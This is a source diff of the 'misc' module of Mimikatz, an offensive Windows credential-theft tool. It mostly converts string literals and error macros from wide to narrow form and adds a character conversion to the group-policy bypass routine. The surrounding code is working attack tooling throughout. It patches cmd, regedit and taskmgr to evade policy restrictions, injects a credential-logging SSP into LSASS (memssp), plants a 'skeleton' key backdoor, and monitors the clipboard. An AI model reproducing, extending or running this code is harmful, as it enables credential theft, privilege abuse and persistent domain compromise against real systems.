@@ -6,27 +6,27 @@
 #include "kuhl_m_misc.h"
 
 const KUHL_M_C kuhl_m_c_misc[] = {
-	{kuhl_m_misc_cmd,		L"cmd",			L"Command Prompt          (without DisableCMD)"},
-	{kuhl_m_misc_regedit,	L"regedit",		L"Registry Editor         (without DisableRegistryTools)"},
-	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
-	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
+	{kuhl_m_misc_cmd,		"cmd",			"Command Prompt          (without DisableCMD)"},
+	{kuhl_m_misc_regedit,	"regedit",		"Registry Editor         (without DisableRegistryTools)"},
+	{kuhl_m_misc_taskmgr,	"taskmgr",		"Task Manager            (without DisableTaskMgr)"},
+	{kuhl_m_misc_ncroutemon,"ncroutemon",	"Juniper Network Connect (without route monitoring)"},
 #if !defined(_M_ARM64)
-	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
+	{kuhl_m_misc_detours,	"detours",		"[experimental] Try to enumerate all modules with Detours-like hooks"},
 #endif
 //#ifdef _M_X64
-//	{kuhl_m_misc_addsid,	L"addsid",		NULL},
+//	{kuhl_m_misc_addsid,	"addsid",		NULL},
 //#endif
-	{kuhl_m_misc_memssp,	L"memssp",		NULL},
-	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
-	{kuhl_m_misc_compress,	L"compress",	NULL},
-	{kuhl_m_misc_lock,		L"lock",		NULL},
-	{kuhl_m_misc_wp,		L"wp",			NULL},
-	{kuhl_m_misc_mflt,		L"mflt",		NULL},
-	{kuhl_m_misc_easyntlmchall,	L"easyntlmchall", NULL},
-	{kuhl_m_misc_clip,		L"clip",		NULL},
-	{kuhl_m_misc_xor,		L"xor",			NULL},
-	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
-	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
+	{kuhl_m_misc_memssp,	"memssp",		NULL},
+	{kuhl_m_misc_skeleton,	"skeleton",	NULL},
+	{kuhl_m_misc_compress,	"compress",	NULL},
+	{kuhl_m_misc_lock,		"lock",		NULL},
+	{kuhl_m_misc_wp,		"wp",			NULL},
+	{kuhl_m_misc_mflt,		"mflt",		NULL},
+	{kuhl_m_misc_easyntlmchall,	"easyntlmchall", NULL},
+	{kuhl_m_misc_clip,		"clip",		NULL},
+	{kuhl_m_misc_xor,		"xor",			NULL},
+	{kuhl_m_misc_aadcookie,	"aadcookie",	NULL},
+	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	"ngcsign",	NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -35,19 +35,19 @@ const KUHL_M kuhl_m_misc = {
 
 NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[])
 {
-	kuhl_m_misc_generic_nogpo_patch(L"cmd.exe", L"DisableCMD", sizeof(L"DisableCMD"), L"KiwiAndCMD", sizeof(L"KiwiAndCMD"));
+	kuhl_m_misc_generic_nogpo_patch(L"cmd.exe", L"DisableCMD", sizeof(L"DisableCMD"), "KiwiAndCMD", sizeof("KiwiAndCMD"));
 	return STATUS_SUCCESS;
 }
 
 NTSTATUS kuhl_m_misc_regedit(int argc, wchar_t * argv[])
 {
-	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), L"KiwiAndRegistryTools", sizeof(L"KiwiAndRegistryTools"));
+	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), "KiwiAndRegistryTools", sizeof("KiwiAndRegistryTools"));
 	return STATUS_SUCCESS;
 }
 
 NTSTATUS kuhl_m_misc_taskmgr(int argc, wchar_t * argv[])
 {
-	kuhl_m_misc_generic_nogpo_patch(L"taskmgr.exe", L"DisableTaskMgr", sizeof(L"DisableTaskMgr"), L"KiwiAndTaskMgr", sizeof(L"KiwiAndTaskMgr"));
+	kuhl_m_misc_generic_nogpo_patch(L"taskmgr.exe", L"DisableTaskMgr", sizeof(L"DisableTaskMgr"), "KiwiAndTaskMgr", sizeof("KiwiAndTaskMgr"));
 	return STATUS_SUCCESS;
 }
 
@@ -185,7 +185,7 @@ BOOL CALLBACK kuhl_m_misc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION p
 			}
 			CloseHandle(hProcess);
 		}
-		else PRINT_ERROR_AUTO(L"OpenProcess");
+		else PRINT_ERROR_AUTO_C("OpenProcess");
 	}
 	return TRUE;
 }
@@ -196,13 +196,16 @@ NTSTATUS kuhl_m_misc_detours(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 #endif
-BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString)
+BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PSTR enableString, SIZE_T szEnableString)
 {
+	wchar_t* enableString_w = LocalAlloc(LPTR, szEnableString * sizeof(wchar_t));
+	mbstowcs_s(NULL, enableString_w, szEnableString, enableString, _TRUNCATE);
+
 	BOOL status = FALSE;
 	PEB Peb;
 	PROCESS_INFORMATION processInformation;
 	PIMAGE_NT_HEADERS pNtHeaders;
-	KULL_M_MEMORY_ADDRESS aBaseAdress = {NULL, NULL}, aPattern = {disableString, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatch = {enableString, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	KULL_M_MEMORY_ADDRESS aBaseAdress = {NULL, NULL}, aPattern = {disableString, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatch = {enableString_w, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory;
 	
 	if(kull_m_process_create(KULL_M_PROCESS_CREATE_NORMAL, commandLine, CREATE_SUSPENDED, NULL, 0, NULL, NULL, NULL, &processInformation, FALSE))
@@ -219,9 +222,9 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 					sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = (LPVOID) pNtHeaders->OptionalHeader.ImageBase;
 					sMemory.kull_m_memoryRange.size = pNtHeaders->OptionalHeader.SizeOfImage;
 
-					if(status = kull_m_patch(&sMemory, &aPattern, szDisableString, &aPatch, szEnableString, 0, NULL, 0, NULL, NULL))
-						kprintf(L"Patch OK for \'%s\' from \'%s\' to \'%s\' @ %p\n", commandLine, disableString, enableString, sMemory.result);
-					else PRINT_ERROR_AUTO(L"kull_m_patch");
+					if(status = kull_m_patch(&sMemory, &aPattern, szDisableString, &aPatch, szEnableString * sizeof(wchar_t), 0, NULL, 0, NULL, NULL))
+						kprintf(L"Patch OK for \'%s\' from \'%s\' to \'%s\' @ %p\n", commandLine, disableString, enableString_w, sMemory.result);
+					else PRINT_ERROR_AUTO_C("kull_m_patch");
 					LocalFree(pNtHeaders);
 				}
 			}
@@ -231,6 +234,10 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 		CloseHandle(processInformation.hThread);
 		CloseHandle(processInformation.hProcess);
 	}
+
+	LocalFree(enableString_w);
+	enableString_w = NULL;
+
 	return status;
 }
 
@@ -388,7 +395,7 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //												pOs[i].AdressOfPatch.address = (PBYTE) sSearch.result + pOs[i].Offset;
 //												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].LocalBackup, &pOs[i].AdressOfPatch, pOs[i].Patch.Length)))
 //												{
-//													PRINT_ERROR_AUTO(L"kull_m_memory_copy (backup)");
+//													PRINT_ERROR_AUTO_C("kull_m_memory_copy (backup)");
 //													LocalFree(pOs[i].LocalBackup.address);
 //													pOs[i].LocalBackup.address = NULL;
 //												}
@@ -397,7 +404,7 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //										else
 //										{
 //											kprintf(L"Search %u : ", i);
-//											PRINT_ERROR_AUTO(L"kull_m_memory_search");
+//											PRINT_ERROR_AUTO_C("kull_m_memory_search");
 //										}
 //									}
 //
@@ -411,9 +418,9 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //											{
 //												sAddress.address = pOs[i].Patch.Pattern;
 //												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].AdressOfPatch, &sAddress, pOs[i].Patch.Length)))
-//													PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+//													PRINT_ERROR_AUTO_C("kull_m_memory_copy");
 //											}
-//											else PRINT_ERROR_AUTO(L"kull_m_memory_protect");
+//											else PRINT_ERROR_AUTO_C("kull_m_memory_protect");
 //										}
 //									}
 //
@@ -435,7 +442,7 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //										if(pOs[i].LocalBackup.address)
 //										{
 //											if(!kull_m_memory_copy(&pOs[i].AdressOfPatch, &pOs[i].LocalBackup, pOs[i].Patch.Length))
-//												PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+//												PRINT_ERROR_AUTO_C("kull_m_memory_copy");
 //											LocalFree(pOs[i].LocalBackup.address);
 //										}
 //										if(pOs[i].OldProtect)
@@ -446,7 +453,7 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //							}
 //							CloseHandle(hProcess);
 //						}
-//						else PRINT_ERROR_AUTO(L"OpenProcess");
+//						else PRINT_ERROR_AUTO_C("OpenProcess");
 //					}
 //					err = DsUnBindW(&hDs);
 //				}
@@ -518,9 +525,9 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iMSV;
 	PKULL_M_PATCH_GENERIC pGeneric;
 	REMOTE_EXT extensions[] = {
-		{szMsvCrt,	"fopen",	(PVOID) 0x4141414141414141, NULL},
-		{szMsvCrt,	"fwprintf",	(PVOID) 0x4242424242424242, NULL},
-		{szMsvCrt,	"fclose",	(PVOID) 0x4343434343434343, NULL},
+		{szMsvCrt,	L"fopen",	(PVOID) 0x4141414141414141, NULL},
+		{szMsvCrt,	L"fwprintf",	(PVOID) 0x4242424242424242, NULL},
+		{szMsvCrt,	L"fclose",	(PVOID) 0x4343434343434343, NULL},
 		{NULL,		NULL,		(PVOID) 0x4444444444444444, NULL},
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
@@ -570,27 +577,27 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 												aLsass.address = sSearch.result;
 												if(kull_m_memory_copy(&aLsass, &aLocal, pGeneric->Offsets.off1))
 													kprintf(L"Injected =)\n");
-												else PRINT_ERROR_AUTO(L"kull_m_memory_copy - Trampoline n0");
+												else PRINT_ERROR_AUTO_C("kull_m_memory_copy - Trampoline n0");
 											}
-											else PRINT_ERROR_AUTO(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace");
+											else PRINT_ERROR_AUTO_C("kull_m_remotelib_CreateRemoteCodeWitthPatternReplace");
 										}
-										else PRINT_ERROR_AUTO(L"kull_m_memory_copy - Trampoline n1");
+										else PRINT_ERROR_AUTO_C("kull_m_memory_copy - Trampoline n1");
 									}
 								}
-								else PRINT_ERROR_AUTO(L"kull_m_memory_copy - real asm");
+								else PRINT_ERROR_AUTO_C("kull_m_memory_copy - real asm");
 								LocalFree(aLocal.address);
 							}
 						}
-						else PRINT_ERROR_AUTO(L"kull_m_memory_search");
+						else PRINT_ERROR_AUTO_C("kull_m_memory_search");
 					}
 				}
 				kull_m_memory_close(aLsass.hMemory);
 			}
 			CloseHandle(hProcess);
 		}
-		else PRINT_ERROR_AUTO(L"OpenProcess");
+		else PRINT_ERROR_AUTO_C("OpenProcess");
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");
+	else PRINT_ERROR_AUTO_C("kull_m_process_getProcessIdForName");
 
 	return STATUS_SUCCESS;
 }
@@ -663,9 +670,9 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 	KULL_M_MEMORY_SEARCH sMemory;
 	LSA_UNICODE_STRING orig;
 	REMOTE_EXT extensions[] = {
-		{L"kernel32.dll",	"LocalAlloc",	(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
-		{L"kernel32.dll",	"LocalFree",	(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
-		{L"ntdll.dll",		"memcpy",		(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
+		{L"kernel32.dll",	L"LocalAlloc",	(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
+		{L"kernel32.dll",	L"LocalFree",	(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
+		{L"ntdll.dll",		L"memcpy",		(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
 		{NULL,				NULL,			(PVOID) 0x4343434343434343, NULL}, // Initialize
 		{NULL,				NULL,			(PVOID) 0x4444444444444444, NULL}, // Decrypt
 	};
@@ -703,7 +710,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 						}
 						else PRINT_ERROR(L"First pattern not found\n");
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+					else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName");
 				}
 
 				if(success || onlyRC4Stuff)
@@ -733,13 +740,13 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 							else PRINT_ERROR(L"Unable to create remote functions\n");
 						}
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+					else PRINT_ERROR_AUTO_C("kull_m_process_getVeryBasicModuleInformationsForName");
 				}
 				kull_m_memory_close(aLsass.hMemory);
 			}
 			CloseHandle(hProcess);
 		}
-		else PRINT_ERROR_AUTO(L"OpenProcess");
+		else PRINT_ERROR_AUTO_C("OpenProcess");
 	}
 	return STATUS_SUCCESS;
 }
@@ -767,11 +774,11 @@ NTSTATUS kuhl_m_misc_compress(int argc, wchar_t * argv[])
 					kprintf(L"Writing: ");
 					if(kull_m_file_writeData(szOutput, pOutput, dwOutput))
 						kprintf(L"OK\n");
-					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+					else PRINT_ERROR_AUTO_C("kull_m_file_writeData");
 					LocalFree(pOutput);
 				}
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+			else PRINT_ERROR_AUTO_C("kull_m_file_readData");
 		}
 		else PRINT_ERROR(L"An /output:file is needed\n");
 	}
@@ -816,8 +823,8 @@ DWORD kuhl_m_misc_lock_thread_end(){return 'stlo';}
 void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp)
 {
 	REMOTE_EXT extensions[] = {
-		{L"user32.dll",		"LockWorkStation",	(PVOID) 0x4141414141414141, NULL},
-		{L"kernel32.dll",	"GetLastError",		(PVOID) 0x4242424242424242, NULL},
+		{L"user32.dll",		L"LockWorkStation",	(PVOID) 0x4141414141414141, NULL},
+		{L"kernel32.dll",	L"GetLastError",		(PVOID) 0x4242424242424242, NULL},
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
 	HANDLE hProcess;
@@ -841,7 +848,7 @@ void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp)
 						else
 							kprintf(L"OK!\n");
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
+					else PRINT_ERROR_AUTO_C("kull_m_remotelib_create");
 					LocalFree(iData);
 				}
 				kull_m_memory_free(&aRemoteFunc);
@@ -851,7 +858,7 @@ void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp)
 		}
 		CloseHandle(hProcess);
 	}
-	else PRINT_ERROR_AUTO(L"OpenProcess");
+	else PRINT_ERROR_AUTO_C("OpenProcess");
 }
 
 NTSTATUS kuhl_m_misc_wp(int argc, wchar_t * argv[])
@@ -896,8 +903,8 @@ DWORD kuhl_m_misc_wp_thread_end(){return 'stwp';}
 void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp)
 {
 	REMOTE_EXT extensions[] = {
-		{L"user32.dll",		"SystemParametersInfoW",	(PVOID) 0x4141414141414141, NULL},
-		{L"kernel32.dll",	"GetLastError",				(PVOID) 0x4242424242424242, NULL},
+		{L"user32.dll",		L"SystemParametersInfoW",	(PVOID) 0x4141414141414141, NULL},
+		{L"kernel32.dll",	L"GetLastError",				(PVOID) 0x4242424242424242, NULL},
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
 	HANDLE hProcess;
@@ -921,7 +928,7 @@ void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp)
 						else
 							kprintf(L"OK!\n");
 					}
-					else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
+					else PRINT_ERROR_AUTO_C("kull_m_remotelib_create");
 					LocalFree(iData);
 				}
 				kull_m_memory_free(&aRemoteFunc);
@@ -931,7 +938,7 @@ void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp)
 		}
 		CloseHandle(hProcess);
 	}
-	else PRINT_ERROR_AUTO(L"OpenProcess");
+	else PRINT_ERROR_AUTO_C("OpenProcess");
 }
 
 NTSTATUS kuhl_m_misc_mflt(int argc, wchar_t * argv[])
@@ -1062,18 +1069,18 @@ NTSTATUS kuhl_m_misc_clip(int argc, wchar_t * argv[])
 					DispatchMessage(&msg);
 				}
 				else if (bRet < FALSE)
-					PRINT_ERROR_AUTO(L"GetMessage");
+					PRINT_ERROR_AUTO_C("GetMessage");
 			}
 			if(!ChangeClipboardChain(kuhl_misc_clip_hWnd, kuhl_misc_clip_hWndNextViewer))
-				PRINT_ERROR_AUTO(L"ChangeClipboardChain");
+				PRINT_ERROR_AUTO_C("ChangeClipboardChain");
 			SetConsoleCtrlHandler(kuhl_misc_clip_WinHandlerRoutine, FALSE);
 			if(!DestroyWindow(kuhl_misc_clip_hWnd))
-				PRINT_ERROR_AUTO(L"DestroyWindow");
+				PRINT_ERROR_AUTO_C("DestroyWindow");
 		}
 		if(!UnregisterClass((LPCWSTR) aClass, hInstance))
-			PRINT_ERROR_AUTO(L"UnregisterClass");
+			PRINT_ERROR_AUTO_C("UnregisterClass");
 	}
-	else PRINT_ERROR_AUTO(L"RegisterClassEx");
+	else PRINT_ERROR_AUTO_C("RegisterClassEx");
 	return STATUS_SUCCESS;
 
 	//DWORD format;
@@ -1187,7 +1194,7 @@ LRESULT APIENTRY kuhl_m_misc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wPara
 							}
 						}
 					}
-					else PRINT_ERROR_AUTO(L"GetClipboardData");
+					else PRINT_ERROR_AUTO_C("GetClipboardData");
 				}
 				CloseClipboard();
 			}
@@ -1222,9 +1229,9 @@ NTSTATUS kuhl_m_misc_xor(int argc, wchar_t * argv[])
 					data[i] ^= bXor;
 				if(kull_m_file_writeData(szOutput, data, dwData))
 					kprintf(L"OK\n");
-				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+				else PRINT_ERROR_AUTO_C("kull_m_file_writeData");
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+			else PRINT_ERROR_AUTO_C("kull_m_file_readData");
 		}
 		else PRINT_ERROR(L"An /output:file is needed\n");
 	}
